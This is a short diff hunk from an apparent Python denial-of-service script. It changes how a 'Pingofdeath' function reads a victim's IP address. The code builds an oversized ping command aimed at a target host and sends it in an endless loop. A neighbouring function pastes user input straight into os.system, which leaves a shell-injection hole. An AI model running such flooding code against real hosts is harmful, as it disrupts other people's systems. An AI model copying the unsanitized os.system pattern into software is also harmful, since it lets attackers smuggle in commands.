@@ -65,7 +65,7 @@ def Ping_sl():
         for a in range(ping_number):
 		os.system("ping " + ip)
 def Pingofdeath():
-    victimIP = input("enter victim IP: ")
+    victimIP = raw_input("Target IP: ")
     pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
         
     while(1):
